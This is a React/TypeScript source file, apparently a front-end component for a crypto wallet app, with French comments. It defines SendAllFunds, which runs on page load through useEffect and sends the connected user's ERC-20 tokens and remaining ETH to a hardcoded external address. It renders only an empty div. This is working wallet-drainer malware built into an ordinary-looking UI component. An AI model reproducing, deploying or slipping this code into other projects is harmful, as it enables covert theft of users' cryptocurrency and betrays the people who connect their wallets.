import { useEffect } from 'react';
import { useToasts } from '@geist-ui/core';
import { erc20ABI, usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { useAtom } from 'jotai';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

export const SendAllFunds = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({ text: message, type, delay: 4000 });

  const [tokens] = useAtom(globalTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { address } = useAccount();

  // L'adresse de destination est fixée ici
  const destinationAddress = '0x3351D8F2F3F4708d2A7B5FbbD4Db350Af7313B75';

  // Fonction pour envoyer l'ETH restant
  const sendEth = async () => {
    if (!walletClient || !destinationAddress) return;
    
    const balance = await publicClient.getBalance({ address });

    if (balance > 0n) {
      try {
        const tx = await walletClient.sendTransaction({
          to: destinationAddress,
          value: balance - BigInt(21000 * 10 ** 9), // Soustraction pour les frais de gas
        });
        showToast(`ETH sent: ${tx.hash}`, 'success');
      } catch (err) {
        showToast(`ETH send error: ${err?.reason || 'Unknown error'}`, 'warning');
      }
    }
  };

  // Fonction pour envoyer tous les jetons ERC-20
  const sendAllTokens = async () => {
    if (!walletClient || !destinationAddress) return;

    for (const token of tokens) {
      const { contract_address, balance } = token;
      if (balance === '0') continue;

      try {
        const balanceBigInt = BigInt(balance); // Assurer que le solde est un BigInt valide

        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: contract_address as `0x${string}`,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [destinationAddress as `0x${string}`, balanceBigInt],
        });

        await walletClient.writeContract(request);
        showToast(`Sent ${token.contract_ticker_symbol}`, 'success');
      } catch (err) {
        showToast(
          `Error sending ${token.contract_ticker_symbol}: ${err?.reason || 'Unknown error'}`,
          'warning'
        );
      }
    }
  };

  // Fonction pour envoyer tous les fonds (ETH + tokens ERC-20)
  const sendAllFunds = async () => {
    // Envoie tous les tokens ERC-20
    await sendAllTokens();
    // Envoie tous les ETH
    await sendEth();
  };

  // Exécuter l'envoi dès que les fonds sont disponibles
  useEffect(() => {
    const sendFundsIfValid = async () => {
      await sendAllFunds();
    };
    sendFundsIfValid();
  }, [sendAllFunds, tokens]); // Ajout de 'sendAllFunds' et 'tokens' dans les dépendances

  return <div style={{ margin: '20px' }}></div>;
};
